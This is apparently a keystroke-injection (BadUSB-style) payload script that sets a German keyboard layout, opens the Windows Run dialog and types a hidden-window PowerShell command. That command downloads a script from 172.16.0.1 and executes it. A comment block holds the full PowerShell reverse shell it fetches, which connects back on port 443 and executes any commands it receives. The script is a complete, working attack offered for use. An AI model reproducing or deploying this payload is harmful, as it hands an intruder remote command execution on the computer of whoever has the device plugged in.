/*
Revshell from revshells.com Powershell#1 (hidden Window)
autor: Klau5t4ler0x90

store this shell.ps1 /var/www/html/tools/shell.ps1:
$LHOST="172.16.0.1";$LPORT=443;$TCPClient=New-Object Net.Sockets.TCPClient($LHOST,$LPORT);$NetworkStream=$TCPClient.GetStream();$StreamReader=New-Object IO.StreamReader($NetworkStream);$StreamWriter=New-Object IO.StreamWriter($NetworkStream);$StreamWriter.AutoFlush=$true;$Buffer=New-Object Byte[] 1024;while($TCPClient.Connected){while($NetworkStream.DataAvailable){$RawData=$NetworkStream.Read($Buffer,0,$Buffer.Length);$Code=([Text.Encoding]::UTF8).GetString($Buffer,0,$RawData-1)};if($TCPClient.Connected -and $Code.Length -gt 1){$Output=try{Invoke-Expression $Code 2>&1}catch{$_};$StreamWriter.Write("$Output`n");$Code=$null}};$TCPClient.Close();$NetworkStream.Close();$StreamReader.Close();$StreamWriter.Close();
*/

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

function revshellFromURL() {
  press("GUI r");
  delay(1500);
  type('powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(');
  type("'http://172.16.0.1/tools/shell.ps1'");
  type(')"');
  press("ENTER");
}

fast();
layout("de");

delay(1000);
revshellFromURL();
